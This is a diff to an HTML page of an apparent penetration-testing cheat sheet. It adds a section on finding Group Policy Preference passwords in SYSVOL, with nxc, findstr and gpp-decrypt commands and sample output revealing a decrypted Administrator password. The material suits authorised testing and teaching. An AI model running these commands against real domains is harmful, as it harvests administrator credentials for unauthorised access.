@@ -151,6 +151,9 @@
   <li><a href="https://tldrbins.github.io/@reconnaissance/">Reconnaissance</a></li>
   <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
   <li><a href="https://tldrbins.github.io/@ads/">ADS</a></li>
+  <li><a href="https://tldrbins.github.io/@gpp/">GPP</a></li>
+  <li><a href="https://tldrbins.github.io/@group-policy-preference/">Group Policy Preference</a></li>
+  <li><a href="https://tldrbins.github.io/@sysvol/">SYSVOL</a></li>
 </ul>
 <hr>
 <div class="content">
@@ -449,7 +452,61 @@ TO-DO</div></pre></div><hr>
 <h3 id="change-smb-password-with-old-password">Change SMB Password (with Old Password)</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">smbpasswd -r <span class="o editable-keyword">&lt;TARGET&gt;</span> -U <span class="o editable-keyword">&lt;USER&gt;</span>
 </span></span></span></code><div class="output-bubble">Sample Output:
-TO-DO</div></pre></div>
+TO-DO</div></pre></div><hr>
+<h3 id="enum-gpp-group-policy-perference">Enum GPP (Group Policy Perference)</h3>
+<p class="tabs">
+<button data-tabset="set6" data-tabcontent="tab1" class="active">Linux</button>
+
+<button data-tabset="set6" data-tabcontent="tab2">Windows</button>
+
+</p><div class="tabset-wrapper" data-tabset-group="set6"><div class="tabcontent active" data-tabset="set6" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Password
+</span></span><span class="line"><span class="cl"><span class="go">nxc smb <span class="o editable-keyword">&lt;TARGET&gt;</span> -u '<span class="o editable-keyword">&lt;USER&gt;</span>' -p '<span class="o editable-keyword">&lt;PASSWORD&gt;</span>' -d <span class="o editable-keyword">&lt;DOMAIN&gt;</span> -M gpp_password
+</span></span></span></code><div class="output-bubble">Sample Output:
+<span class="line"><span class="cl"><span class="gp">$</span> nxc smb dc.example.com -u <span class="s1">'apple.seed'</span> -p <span class="s1">'Test1234'</span> -d example.com -M gpp_password
+</span></span><span class="line"><span class="cl"><span class="go">SMB         224.0.0.1       445    DC            [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:example.com) (signing:True) (SMBv1:True) 
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         224.0.0.1       445    DC            [+] example.com\apple.seed:Test1234 
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         224.0.0.1       445    DC            [*] Enumerated shares
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         224.0.0.1       445    DC            Share           Permissions     Remark
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         224.0.0.1       445    DC            -----           -----------     ------
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         224.0.0.1       445    DC            accounting$                     
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         224.0.0.1       445    DC            ADMIN$                          Remote Admin
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         224.0.0.1       445    DC            C$                              Default share
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         224.0.0.1       445    DC            CertEnroll      READ            Active Directory Certificate Services share
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         224.0.0.1       445    DC            home$           READ            
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         224.0.0.1       445    DC            IPC$            READ            Remote IPC
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         224.0.0.1       445    DC            it$                             
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         224.0.0.1       445    DC            NETLOGON        READ            Logon server share 
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         224.0.0.1       445    DC            SYSVOL          READ            Logon server share 
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         224.0.0.1       445    DC            transfer$       READ,WRITE      
+</span></span></span><span class="line"><span class="cl"><span class="go">GPP_PASS... 224.0.0.1       445    DC            [+] Found SYSVOL share
+</span></span></span><span class="line"><span class="cl"><span class="go">GPP_PASS... 224.0.0.1       445    DC            [*] Searching for potential XML files containing passwords
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         224.0.0.1       445    DC            [*] Started spidering
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         224.0.0.1       445    DC            [*] Spidering .
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         224.0.0.1       445    DC            //224.0.0.1/SYSVOL/example.com/Policies/{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}/Machine/Preferences/Groups/Groups.xml [lastm:'2024-06-04 16:01' size:1135]
+</span></span></span><span class="line"><span class="cl"><span class="go">SMB         224.0.0.1       445    DC            [*] Done spidering (Completed in 35.11537528038025)
+</span></span></span><span class="line"><span class="cl"><span class="go">GPP_PASS... 224.0.0.1       445    DC            [*] Found example.com/Policies/{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}/Machine/Preferences/Groups/Groups.xml
+</span></span></span><span class="line"><span class="cl"><span class="go">GPP_PASS... 224.0.0.1       445    DC            [+] Found credentials in example.com/Policies/{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}/Machine/Preferences/Groups/Groups.xml
+</span></span></span><span class="line"><span class="cl"><span class="go">GPP_PASS... 224.0.0.1       445    DC            Password: P@ssword2024!
+</span></span></span><span class="line"><span class="cl"><span class="go">GPP_PASS... 224.0.0.1       445    DC            action: U
+</span></span></span><span class="line"><span class="cl"><span class="go">GPP_PASS... 224.0.0.1       445    DC            newName: _local
+</span></span></span><span class="line"><span class="cl"><span class="go">GPP_PASS... 224.0.0.1       445    DC            fullName: 
+</span></span></span><span class="line"><span class="cl"><span class="go">GPP_PASS... 224.0.0.1       445    DC            description: local administrator
+</span></span></span><span class="line"><span class="cl"><span class="go">GPP_PASS... 224.0.0.1       445    DC            changeLogon: 0
+</span></span></span><span class="line"><span class="cl"><span class="go">GPP_PASS... 224.0.0.1       445    DC            noChange: 0
+</span></span></span><span class="line"><span class="cl"><span class="go">GPP_PASS... 224.0.0.1       445    DC            neverExpires: 1
+</span></span></span><span class="line"><span class="cl"><span class="go">GPP_PASS... 224.0.0.1       445    DC            acctDisabled: 0
+</span></span></span><span class="line"><span class="cl"><span class="go">GPP_PASS... 224.0.0.1       445    DC            subAuthority: RID_ADMIN
+</span></span></span><span class="line"><span class="cl"><span class="go">GPP_PASS... 224.0.0.1       445    DC            userName: Administrator (built-in)
+</span></span></span></div></pre></div></div><div class="tabcontent" data-tabset="set6" data-tabcontent="tab2"><h4 id="1-enum">1. Enum</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">findstr /S /I cpassword \\<span class="o editable-keyword">&lt;DOMAIN&gt;</span>\SYSVOL\<span class="o editable-keyword">&lt;DOMAIN&gt;</span>\Policies\*.xml
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div><h4 id="2-decrypt">2. Decrypt</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">gpp-decrypt <span class="o editable-keyword">&lt;HASH&gt;</span>
+</span></span></span></code><div class="output-bubble">Sample Output:
+TO-DO</div></pre></div></div></div>
+
+<p></p>
+
 </div>
 </main>
 <script type="module" src="/js/main.js"></script>
